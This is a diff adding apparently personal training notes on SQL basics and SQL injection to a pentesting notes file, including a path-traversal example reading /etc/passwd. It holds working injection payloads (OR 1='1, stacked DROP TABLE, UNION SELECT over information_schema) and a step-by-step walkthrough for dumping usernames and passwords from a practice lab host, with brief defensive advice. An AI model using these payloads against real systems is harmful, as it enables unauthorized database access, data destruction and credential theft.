@@ -1,3 +1,4 @@
+ls
 # TAKE GOOD NOTES 
 
 # write down all tunnels. Just copy and paste after done with it
@@ -348,4 +349,162 @@ example http://127.0.0.1:5432/books_pick.php?book=../../../../etc/passwd
 # going to other peoples directories
 ```
 after log in just cd ../ to see other users available
+```
+
+# SQL
+S tructured Q uery L anguage - ANSI Standard
+# Standard Commands
+```
+SELECT: Extracts data from a database
+UNION: Used to combine the result-set of two or more SELECT statements
+USE: Selects the DB to use
+UPDATE: Updates data in a database
+DELETE: Deletes data from a database
+INSERT INTO: Inserts new data into a database
+CREATE DATABASE: Creates a new database
+ALTER DATABASE: Modifies a database
+CREATE TABLE: Creates a new table
+ALTER TABLE: Modifies a table
+DROP TABLE: Deletes a table
+CREATE INDEX: Creates an index (search key)
+DROP INDEX: Deletes an index
+```
+https://www.w3schools.com/SQL/sql_syntax.asp
+# sql commands
+```
+mysql
+help (gives help) ;
+show databases ; (will show what is on the box info mysql and performance are the default databases)
+use information_schema ; (drops into the database itself, contains info on other databases it is connected to)
+show columns from columns ; (important fields are Column_name(saves column names in the database), Table_schema(), Table_name(info on table in the databases))
+select table_name from information_schema.columns ; (from the information_schema.columns database it will show all the table names available)
+select table_name,column_name from information_schema.columns ; (adds columns name to last command)
+select table_schema,table_name,column_name from information_schema.columns ; (golden statement)
+show tables from session ; (dumps data bases from session)
+show columns from session.Tires ; (Can be case sensitive)
+select tireid,name,size from session.Tires ; (look in header field from previous command to get what to look at)
+select tireid,name,size from session.Tires UNION SELECT name,tpye,cost from session.car ; (can get two databases in one display, if one field has more columns then the other add a number to the first part to allow another column to be created. example below)
+select tireid,name,size, 4 from session.Tires UNION SELECT name,tpye,cost,color from session.car ; (will show header as tireid name size 4 ut it will have all the info needed)
+SELECT  * FROM movies where year not between 2000 and 2010; (finds all information not between the years written)
+SELECT * FROM movies where title LIKE "Toy Story%"; (finds information that is like what is written. % can be before or after as a matching tool)
+SELECT * FROM movies where year > 2009 order by year desc ; (List the last four Pixar movies released (ordered from most recent to least) )
+SELECT title FROM movies
+ORDER BY title ASC
+LIMIT 5 OFFSET 5; (List the next five Pixar movies sorted alphabetically )
+SELECT city, latitude FROM north_american_cities
+WHERE country = "United States"
+ORDER BY latitude DESC; (Order all the cities in the United States by their latitude from north to south )
+```
+# SQL Injection - Considerations
+```
+Requires Valid SQL Queries
+Fully patched systems can be vulnerable due to misconfiguration
+Input Field Sanitization
+String vs Integer Values
+Is information_schema Database available?
+GET Request versus POST Request HTTP methods
+```
+# Unsanitized vs Sanitized Fields
+```
+Unsanitized: input fields can be found using a Single Quote ⇒ '
+  Will return extraneous information
+  ' closes a variable, to allow for additional statements/clauses
+  May show no errors or generic error (harder Injection)
+Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
+```
+#Server-Side Query Processing
+```
+User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
+The Server-Side Query that would be passed to MySQL from PHP would be:
+BEFORE INPUT:
+ SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+AFTER INPUT:
+ SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
+```
+# Example - Injecting Your Statement
+```
+User enters tom' OR 1='1 in the name and pass fields.
+Truth Statement: tom ' OR 1='1
+Server-Side query executed would appear like this:
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+```
+# Stacking Statements
+```
+Chaining multiple statements together using a semi-colon ;
+SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+```
+# Nesting statements
+```
+Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+Though they may allow for nesting a statement within an existing one:
+php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+```
+# Ignore the rest
+```
+Using # or -- tells the Database to ignore everything after
+Server-Side Query:
+SELECT product FROM item WHERE id = $select limit 1;
+Input to Inject:
+1 or 1=1; #
+Server-Side Query becomes:
+SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+```
+# Blind Injection
+```
+Inlcudes Statements to determine how DB is configured
+  Columns in Output
+  Can we return errors
+  Can we return expected Output
+Used when unsanitized fields give generic error or no messages
+       Normal Query to pull expected output:
+       php?item=4
+       Blind injection for validation:
+       php?item=4 OR 1=1
+Try ALL combinations! item=1, item=2, item=3, etc
+```
+# Abuse The Client (GET METHOD)
+```
+Passing injection through the URL:
+After the .php?item=4 pass your UNION statement
+prices.php?item=4 UNION SELECT 1,2
+prices.php?item=4 UNION SELECT 1,2,@@version
+What is @@version?
+```
+# Abuse The Client (Enum)
+```
+Identifying the schema leads to detailed queries to enumerate the DB
+Research Database Schemas and what information they provide
+php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+What are information_schema and database()?
+```
+# Defending Against
+```
+Validate inputs! Methods differ depending on software
+concatenate : turns inputs into single strings or escape characters
+PHP: mysql_real_escape_string
+SQL: sqlite3_prepare()
+```
+# SQL post and get methods
+```
+' OR 1='1 (enter into username and password) (post method)
+click F12 and find the post request, go to the request tab, click raw then add a ? to end of url with the raw you get at the end and we get all user logins (get method)
+example http://10.50.29.140/login.php?username=%27+OR+1%3D%271+&passwd=%27+OR+1%3D%271+
+```
+# Sql vulnerablity
+```
+10.50.29.140 for practice on how to do sql injections
+(Post method)
+1) Identify vulnerable field (example V)
+ [name]' OR 1='1 with all the things to get what is vulnerable
+2) find number of columns we can see (example V)
+ [name]' UNION SELECT 1,2,3,4,5 #
+3) Dump the data base and write down everything that is user created
+   [name]' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns # (since are golden rule only has 3 things to look at we had to add numbers where it would show us the infor we wanted)
+4) get the info from the correct fields
+   [name]' UNION SELECT username,2,passwd,jump,5 FROM [usercreatedfield].userinfo # the fields should look like this when looking things up
+(Get Method)
+1)click on first link and test if it is vulnerable =1 OR 1=1 and continue till it works
+2) put Union SELECT 1,2,3 and so on till you find out how it what is available
+3) @@version will give what ther version of the data base is.
 ```
